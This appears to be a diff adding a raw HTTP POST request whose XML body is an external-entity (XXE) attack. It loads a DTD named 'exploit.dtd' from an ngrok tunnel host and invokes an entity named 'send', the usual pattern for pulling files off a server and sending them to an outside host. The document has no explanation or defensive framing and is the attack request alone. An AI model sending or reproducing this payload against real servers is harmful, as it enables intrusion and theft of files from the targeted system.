@@ -1,0 +1,11 @@
+POST / HTTP/1.1
+Host: 34.44.71.173:8080
+User-Agent: curl/8.7.1
+Accept: /
+Content-Length: 128
+Content-Type: application/xml
+Connection: keep-alive
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://0.tcp.sa.ngrok.io:11720/exploit.dtd">
+<data>&send;</data>
